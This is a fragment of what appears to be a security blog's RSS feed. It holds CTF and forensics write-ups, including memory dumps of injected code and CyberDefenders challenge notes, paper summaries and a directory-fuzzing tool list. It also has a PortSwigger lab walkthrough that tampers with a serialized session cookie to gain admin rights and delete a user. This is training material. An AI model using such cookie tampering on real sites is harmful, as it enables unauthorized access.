&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> ........
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> ........
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">01&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> ........
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x400000: dec ebp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x400001: pop edx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x400002: nop
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x400003: add byte ptr &lt;span style="color:#f92672">[&lt;/span>ebx&lt;span style="color:#f92672">]&lt;/span>, al
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x400005: add byte ptr &lt;span style="color:#f92672">[&lt;/span>eax&lt;span style="color:#f92672">]&lt;/span>, al
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x400007: add byte ptr &lt;span style="color:#f92672">[&lt;/span>eax + eax&lt;span style="color:#f92672">]&lt;/span>, al
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x40000a: add byte ptr &lt;span style="color:#f92672">[&lt;/span>eax&lt;span style="color:#f92672">]&lt;/span>, al
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">7540&lt;/span> smartscreen.ex 0x2505c140000 0x2505c15ffff VadS PAGE_EXECUTE_READWRITE &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">48&lt;/span> &lt;span style="color:#ae81ff">89&lt;/span> &lt;span style="color:#ae81ff">54&lt;/span> &lt;span style="color:#ae81ff">24&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span> &lt;span style="color:#ae81ff">48&lt;/span> &lt;span style="color:#ae81ff">89&lt;/span> 4c H.T$.H.L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">24&lt;/span> &lt;span style="color:#ae81ff">08&lt;/span> 4c &lt;span style="color:#ae81ff">89&lt;/span> &lt;span style="color:#ae81ff">44&lt;/span> &lt;span style="color:#ae81ff">24&lt;/span> &lt;span style="color:#ae81ff">18&lt;/span> 4c $.L.D$.L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">89&lt;/span> 4c &lt;span style="color:#ae81ff">24&lt;/span> &lt;span style="color:#ae81ff">20&lt;/span> &lt;span style="color:#ae81ff">48&lt;/span> 8b &lt;span style="color:#ae81ff">41&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span> .L$.H.A&lt;span style="color:#f92672">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">48&lt;/span> 8b &lt;span style="color:#ae81ff">48&lt;/span> &lt;span style="color:#ae81ff">08&lt;/span> &lt;span style="color:#ae81ff">48&lt;/span> 8b &lt;span style="color:#ae81ff">51&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span> H.H.H.QP
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">48&lt;/span> &lt;span style="color:#ae81ff">83&lt;/span> e2 f8 &lt;span style="color:#ae81ff">48&lt;/span> 8b ca &lt;span style="color:#ae81ff">48&lt;/span> H...H..H
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>b8 &lt;span style="color:#ae81ff">60&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">14&lt;/span> 5c &lt;span style="color:#ae81ff">50&lt;/span> &lt;span style="color:#ae81ff">02&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> .&lt;span style="color:#e6db74">`&lt;/span>..&lt;span style="color:#ae81ff">\P&lt;/span>..
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">48&lt;/span> 2b c8 &lt;span style="color:#ae81ff">48&lt;/span> &lt;span style="color:#ae81ff">81&lt;/span> f9 &lt;span style="color:#ae81ff">70&lt;/span> .H+.H..p
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0f &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">76&lt;/span> &lt;span style="color:#ae81ff">09&lt;/span> &lt;span style="color:#ae81ff">48&lt;/span> c7 c1 ...v.H..
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x2505c140000: mov qword ptr &lt;span style="color:#f92672">[&lt;/span>rsp + 0x10&lt;span style="color:#f92672">]&lt;/span>, rdx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x2505c140005: mov qword ptr &lt;span style="color:#f92672">[&lt;/span>rsp + 8&lt;span style="color:#f92672">]&lt;/span>, rcx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x2505c14000a: mov qword ptr &lt;span style="color:#f92672">[&lt;/span>rsp + 0x18&lt;span style="color:#f92672">]&lt;/span>, r8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x2505c14000f: mov qword ptr &lt;span style="color:#f92672">[&lt;/span>rsp + 0x20&lt;span style="color:#f92672">]&lt;/span>, r9
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x2505c140014: mov rax, qword ptr &lt;span style="color:#f92672">[&lt;/span>rcx + 0x28&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x2505c140018: mov rcx, qword ptr &lt;span style="color:#f92672">[&lt;/span>rax + 8&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x2505c14001c: mov rdx, qword ptr &lt;span style="color:#f92672">[&lt;/span>rcx + 0x50&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x2505c140020: and rdx, 0xfffffffffffffff8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x2505c140024: mov rcx, rdx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x2505c140027: movabs rax, 0x2505c140060
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x2505c140031: sub rcx, rax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x2505c140034: cmp rcx, 0xf70
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x2505c14003b: jbe 0x2505c140046
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>可以看到&lt;code>oneetx.exe&lt;/code>和&lt;code>smartscreen.ex&lt;/code>都有進行一些可疑操作，果然&lt;code>oneetx.exe&lt;/code>就是答案&lt;/li>
&lt;/ul>
&lt;p>:::spoiler Flag
Flag: &lt;code>oneetx.exe&lt;/code>
:::&lt;/p></description></item><item><title>CyberDefender - Spotlight</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/cyberdefender---spotlight/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/cyberdefender---spotlight/</guid><description>&lt;h1 id="cyberdefender---spotlight">
 CyberDefender - Spotlight
 &lt;a class="anchor" href="#cyberdefender---spotlight">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/34#nav-questions">https://cyberdefenders.org/blueteam-ctf-challenges/34#nav-questions&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="tools">
 Tools:
 &lt;a class="anchor" href="#tools">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Autopsy&lt;/li>
&lt;li>&lt;a href="https://github.com/ydkhatri/mac_apt/releases">mac_apt&lt;/a>&lt;/li>
&lt;li>SQLite&lt;/li>
&lt;li>steghide&lt;/li>
&lt;/ul>
&lt;p>:::info
因為這一個lab是有關Mac-OS的forensics，也沒有相關的背景知識，所以解出來的部分大多參考&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>，就是當作第一次學習的課題
:::&lt;/p>
&lt;h2 id="q1">
 ==Q1==
 &lt;a class="anchor" href="#q1">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>What version of macOS is running on this image?&lt;/p>&lt;/blockquote>
&lt;h4 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h4>
&lt;p>這個是參考&lt;sup id="fnref1:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;/p>
&lt;h4 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h4>
&lt;p>在&lt;code>./root/System/Library/CoreServices/&lt;/code>中可以找到&lt;code>SystemVersion.plist&lt;/code>
&lt;img src="https://hackmd.io/_uploads/HJqsQEjQp.png" alt="圖片" />&lt;/p>
&lt;p>:::spoiler Flag
Flag: &lt;code>10.15&lt;/code>
:::&lt;/p>
&lt;h2 id="q2">
 ==Q2==
 &lt;a class="anchor" href="#q2">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>What &amp;ldquo;competitive advantage&amp;rdquo; did Hansel lie about in the file AnotherExample.jpg? (two words)&lt;/p>&lt;/blockquote>
&lt;h4 id="exploit-1">
 Exploit
 &lt;a class="anchor" href="#exploit-1">#&lt;/a>
&lt;/h4>
&lt;p>直接翻一下&lt;code>AnotherExample.jpg&lt;/code>所在的資料夾，就可以發現有一個secret的text檔案，裡面就有這題的flag，不太知道和這張圖片有甚麼關係
:::info
11/13更新: 直接strings search這張圖片也可以找到secret strings的東西
:::&lt;/p></description></item><item><title>CyberDefender - Szechuan Sauce (Part 1)</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/szechuan-sauce---medium/cyberdefender---szechuan-sauce-part-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/szechuan-sauce---medium/cyberdefender---szechuan-sauce-part-1/</guid><description>&lt;h1 id="cyberdefender---szechuan-sauce-part-1">
 CyberDefender - Szechuan Sauce (Part 1)
 &lt;a class="anchor" href="#cyberdefender---szechuan-sauce-part-1">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/31">https://cyberdefenders.org/blueteam-ctf-challenges/31&lt;/a>
Part 2: &lt;a href="https://hackmd.io/@SBK6401/HkAbt-NXT">https://hackmd.io/@SBK6401/HkAbt-NXT&lt;/a>
:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="scenario">
 Scenario
 &lt;a class="anchor" href="#scenario">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>An employee at a large company was assigned a task with a two-day deadline. Realizing that he could not complete the task in that timeframe, he sought help from someone else. After one day, he received a notification from that person who informed him that he had managed to finish the assignment and sent it to the employee as a test. However, the person also sent a message to the employee stating that if he wanted the completed assignment, he would have to pay $160.&lt;/p></description></item><item><title>CyberDefender - Szechuan Sauce (Part 2)</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/szechuan-sauce---medium/cyberdefender---szechuan-sauce-part-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/szechuan-sauce---medium/cyberdefender---szechuan-sauce-part-2/</guid><description>&lt;h1 id="cyberdefender---szechuan-sauce-part-2">
 CyberDefender - Szechuan Sauce (Part 2)
 &lt;a class="anchor" href="#cyberdefender---szechuan-sauce-part-2">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/31">https://cyberdefenders.org/blueteam-ctf-challenges/31&lt;/a>
Part 1: &lt;a href="https://hackmd.io/@SBK6401/rkp952e76">https://hackmd.io/@SBK6401/rkp952e76&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="scenario">
 Scenario
 &lt;a class="anchor" href="#scenario">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>An employee at a large company was assigned a task with a two-day deadline. Realizing that he could not complete the task in that timeframe, he sought help from someone else. After one day, he received a notification from that person who informed him that he had managed to finish the assignment and sent it to the employee as a test. However, the person also sent a message to the employee stating that if he wanted the completed assignment, he would have to pay $160.&lt;/p></description></item><item><title>CyberDefender - Tomcat Takeover</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/network-forensic/cyberdefender---tomcat-takeover/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/network-forensic/cyberdefender---tomcat-takeover/</guid><description>&lt;h1 id="cyberdefender---tomcat-takeover">
 CyberDefender - Tomcat Takeover
 &lt;a class="anchor" href="#cyberdefender---tomcat-takeover">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/135#nav-questions">https://cyberdefenders.org/blueteam-ctf-challenges/135#nav-questions&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="scenario">
 Scenario
 &lt;a class="anchor" href="#scenario">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Our SOC team has detected suspicious activity on one of the web servers within the company&amp;rsquo;s intranet. In order to gain a deeper understanding of the situation, the team has captured network traffic for analysis. This pcap file potentially contains a series of malicious activities that have resulted in the compromise of the Apache Tomcat web server. We need to investigate this incident further.&lt;/p></description></item><item><title>CyberDefender - WebStrike</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/network-forensic/cyberdefender---webstrike/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/network-forensic/cyberdefender---webstrike/</guid><description>&lt;h1 id="cyberdefender---webstrike">
 CyberDefender - WebStrike
 &lt;a class="anchor" href="#cyberdefender---webstrike">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/149">https://cyberdefenders.org/blueteam-ctf-challenges/149&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="scenario">
 Scenario
 &lt;a class="anchor" href="#scenario">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>An anomaly was discovered within our company&amp;rsquo;s intranet as our Development team found an unusual file on one of our web servers. Suspecting potential malicious activity, the network team has prepared a pcap file with critical network traffic for analysis for the security team, and you have been tasked with analyzing the pcap.&lt;/p>&lt;/blockquote>
&lt;h2 id="q1">
 ==Q1==
 &lt;a class="anchor" href="#q1">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Understanding the geographical origin of the attack aids in geo-blocking measures and threat intelligence analysis. What city did the attack originate from?&lt;/p></description></item><item><title>Data Structure</title><link>https://bernie6401.github.io/docs/data-structure/data-structure/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/data-structure/data-structure/</guid><description>&lt;h1 id="data-structure">
 Data Structure
 &lt;a class="anchor" href="#data-structure">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-data-structure-nycu">
 tags: &lt;code>Data Structure&lt;/code> &lt;code>NYCU&lt;/code>
 &lt;a class="anchor" href="#tags-data-structure-nycu">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>&lt;a href="https://bernie6401.github.io/@S7deXzLKQkGUhZX374ALMg/HyyY4lwk2">Lecture 1&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://bernie6401.github.io/@UHzVfhAITliOM3mFSo6mfA/rkpbVewk2">Lecture 2&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://bernie6401.github.io/@S7deXzLKQkGUhZX374ALMg/rymPPeCmh">Lecture 3&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@SBK6401/HkkqlHIm2">Lecture 4&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://bernie6401.github.io/@S7deXzLKQkGUhZX374ALMg/HkiadlBN3">Lecture 5&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@SBK6401/rJloxgM4h">Lecture 6&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://bernie6401.github.io/@S7deXzLKQkGUhZX374ALMg/Hkl511BBn">Lecture 7&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@SBK6401/SJpGh4mSh">Lecture 8&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@SBK6401/rkNBMLk83">Lecture 10&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>DEADFACE CTF 2023</title><link>https://bernie6401.github.io/docs/security/competition/deadface-ctf-2023/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/deadface-ctf-2023/</guid><description>&lt;h1 id="deadface-ctf-2023">
 DEADFACE CTF 2023
 &lt;a class="anchor" href="#deadface-ctf-2023">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler 比賽成果
&lt;img src="https://hackmd.io/_uploads/BkhuIH1QT.png" alt="" />
:::&lt;/p>
&lt;h2 id="steganography">
 Steganography
 &lt;a class="anchor" href="#steganography">#&lt;/a>
&lt;/h2>
&lt;h3 id="youve-been-ransomwared">
 You&amp;rsquo;ve Been Ransomwared
 &lt;a class="anchor" href="#youve-been-ransomwared">#&lt;/a>
&lt;/h3>
&lt;h4 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h4>
&lt;blockquote>
&lt;p>DEADFACE is taunting GlitterCo with their latest ransomware attack. According to our intel, the attackers like to leave a calling card in their attacks. If we can figure out which DEADFACE actor executed this attack, we might be able to figure out a way around paying. Can you find anything in this screenshot that might point to which attacker ran this ransomware attack?&lt;/p></description></item><item><title>DEEPCASE Semi-Supervised Contextual Analysis of Security Events - Notes</title><link>https://bernie6401.github.io/docs/survey-papers/ml-dl-+-security/deepcase-semi-supervised-contextual-analysis-of-security-events---notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/survey-papers/ml-dl-+-security/deepcase-semi-supervised-contextual-analysis-of-security-events---notes/</guid><description>&lt;h1 id="deepcase-semi-supervised-contextual-analysis-of-security-events---notes">
 DEEPCASE Semi-Supervised Contextual Analysis of Security Events - Notes
 &lt;a class="anchor" href="#deepcase-semi-supervised-contextual-analysis-of-security-events---notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-meeting-paper-ntu">
 tags: &lt;code>Meeting Paper&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-meeting-paper-ntu">#&lt;/a>
&lt;/h6>
&lt;p>:::info
Van Ede, T., Aghakhani, H., Spahn, N., Bortolameotti, R., Cova, M., Continella, A., &amp;hellip; &amp;amp; Vigna, G. (2022, May). Deepcase: Semi-supervised contextual analysis of security events. In 2022 IEEE Symposium on Security and Privacy (SP) (pp. 522-539). IEEE.
:::&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10202297">What is NSM(Network Security Monitors)?&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>NSM主要目的是偵測、找出入侵者，提高能見度。它建立在「我們一定會被攻擊，而且最終防禦一定會被突破」的思惟上。假設意志堅決的駭客最終打穿我們辛苦建立的防禦，但只要能在入侵者進一步破壞、感染系統前偵測、做出回應，讓入侵者無法達到目的，便能阻擋這波攻擊&lt;/p>&lt;/blockquote>
&lt;blockquote>
&lt;p>NSM不是等接收IDS/IPS等等資安設備觸發警示後才開始收集，而是平時便預先主動收集資料，提供NSM平台審視、分析，強化可見度，主動找出入侵軌跡&lt;/p>&lt;/blockquote>
&lt;hr>
&lt;p>&lt;a href="https://www.ithome.com.tw/tech/28712">What is IDS(Intrusion Detection Systems)?&lt;/a>&lt;/p></description></item><item><title>DeepLog: Anomaly Detection and Diagnosis from System Logs through Deep Learning</title><link>https://bernie6401.github.io/docs/survey-papers/ml-dl-+-security/deeplog_-anomaly-detection-and-diagnosis-from-system-logs-through-deep-learning/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/survey-papers/ml-dl-+-security/deeplog_-anomaly-detection-and-diagnosis-from-system-logs-through-deep-learning/</guid><description>&lt;h1 id="deeplog-anomaly-detection-and-diagnosis-from-system-logs-through-deep-learning">
 DeepLog: Anomaly Detection and Diagnosis from System Logs through Deep Learning
 &lt;a class="anchor" href="#deeplog-anomaly-detection-and-diagnosis-from-system-logs-through-deep-learning">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-meeting-paper-ntu">
 tags: &lt;code>Meeting Paper&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-meeting-paper-ntu">#&lt;/a>
&lt;/h6>
&lt;p>:::info
Du, M., Li, F., Zheng, G., &amp;amp; Srikumar, V. (2017, October). Deeplog: Anomaly detection and diagnosis from system logs through deep learning. In Proceedings of the 2017 ACM SIGSAC conference on computer and communications security (pp. 1285-1298).
:::&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Model - Log Parser
&lt;a href="https://web.ntnu.edu.tw/~algo/Subsequence2.html">Longest Common Subsequence(LCS)&lt;/a>
&lt;a href="https://www.redhat.com/zh-tw/topics/openstack">認識 OpenStack&lt;/a>&lt;/p>
&lt;hr>
&lt;p>Some attack
&lt;a href="https://wooyun.js.org/drops/Blind%20Return%20Oriented%20Programming%20%28BROP%29%20Attack%20-%20%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86.html">Blind Return Oriented Programming(BROP)&lt;/a>&lt;/p></description></item><item><title>Deserialization - APPRENTICE</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/deserialization---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/deserialization---apprentice/</guid><description>&lt;h1 id="deserialization---apprentice">
 Deserialization - APPRENTICE
 &lt;a class="anchor" href="#deserialization---apprentice">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="lab-modifying-serialized-objects">
 Lab: Modifying serialized objects
 &lt;a class="anchor" href="#lab-modifying-serialized-objects">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Description: This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result.&lt;/li>
&lt;li>Goal: To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos&amp;rsquo;s account.
You can log in to your own account using the following credentials: wiener:peter&lt;/li>
&lt;/ul>
&lt;h3 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>Login First &amp;amp; Recon the package
According to the description, we know that the user verification has insecure deserialization. Therefore, we can recon the package first as below.
&lt;img src="https://i.imgur.com/zuKHXRF.png" alt="" />
You can notice the session is a base64-encoded string and we use the built-in feature in burp suite to decode it.
Session: &lt;code>Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d&lt;/code>
Decoded String: &lt;code>O:4:&amp;quot;User&amp;quot;:2:{s:8:&amp;quot;username&amp;quot;;s:6:&amp;quot;wiener&amp;quot;;s:5:&amp;quot;admin&amp;quot;;b:0;}&lt;/code>&lt;/li>
&lt;li>How about Modify the session directly
&lt;img src="https://i.imgur.com/Ent5yuu.png" alt="" />&lt;/li>
&lt;/ol>
&lt;h3 id="exp---change-directly">
 Exp - Change Directly
 &lt;a class="anchor" href="#exp---change-directly">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>We can use the built-in feature to change our session to &lt;code>admin=1&lt;/code> directly to then send it forward.
:::info
Each package may contain the session that should be modified. So, pay attention to before sending it forward
:::&lt;/li>
&lt;li>Delete Carlos
&lt;img src="https://i.imgur.com/9KGxgZD.png" alt="" />&lt;/li>
&lt;/ol>
&lt;p>:::spoiler Success Screenshot
&lt;img src="https://i.imgur.com/eQEfiaw.png" alt="" />
:::&lt;/p></description></item><item><title>Directory Fuzzing/Traversal Tools</title><link>https://bernie6401.github.io/docs/tools/others/directory-fuzzing---traversal-tools/directory-fuzzing_traversal-tools/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/directory-fuzzing---traversal-tools/directory-fuzzing_traversal-tools/</guid><description>&lt;h1 id="directory-fuzzingtraversal-tools">
 Directory Fuzzing/Traversal Tools
 &lt;a class="anchor" href="#directory-fuzzingtraversal-tools">#&lt;/a>
&lt;/h1>
&lt;h2 id="according-survey-paper">
 According Survey Paper
 &lt;a class="anchor" href="#according-survey-paper">#&lt;/a>
&lt;/h2>
&lt;p>:::info
Aggarwal, V., Kaur, D., Mittal, S., Prasad, T. J. S., Batra, D., &amp;amp; Garg, A. (2023, August). A Comparative Study of Directory Fuzzing Tools. In 2023 International Conference on Circuit Power and Computing Technologies (ICCPCT) (pp. 1368-1374). IEEE.
:::
&lt;img src="https://hackmd.io/_uploads/rJ5oCY450.png" alt="圖片1-1" />&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://github.com/epi052/feroxbuster">feroxbuster&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/xmendez/wfuzz">Wfuzz&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/OJ/gobuster">gobuster&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sourceforge.net/projects/dirbuster/">Dirbuster&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="according-to-csdn-blog---推薦幾款優秀的目錄掃描工具">
 According to CSDN Blog - &lt;a href="https://blog.csdn.net/m0_60571842/article/details/131463420">推薦幾款優秀的目錄掃描工具&lt;/a>
 &lt;a class="anchor" href="#according-to-csdn-blog---%e6%8e%a8%e8%96%a6%e5%b9%be%e6%ac%be%e5%84%aa%e7%a7%80%e7%9a%84%e7%9b%ae%e9%8c%84%e6%8e%83%e6%8f%8f%e5%b7%a5%e5%85%b7">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">7kbscan-WebPathBrute&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/maurosoria/dirsearch">dirsearch&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/lijiejie/BBScan">BBScan&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/VMsec/ihoneyBakFileScan_Modify">ihoneyBakFileScan_Modify&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="according-to-csdn-blog---滲透測試目錄掃描">
 According to CSDN Blog - &lt;a href="https://blog.csdn.net/m0_51191308/article/details/130440572">滲透測試|目錄掃描&lt;/a>
 &lt;a class="anchor" href="#according-to-csdn-blog---%e6%bb%b2%e9%80%8f%e6%b8%ac%e8%a9%a6%e7%9b%ae%e9%8c%84%e6%8e%83%e6%8f%8f">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/H4ckForJob/dirmap">DirMap&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/foryujian/yjdirscan">御劍&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="according-to-google">
 According to Google
 &lt;a class="anchor" href="#according-to-google">#&lt;/a>
&lt;/h2>
&lt;ul>
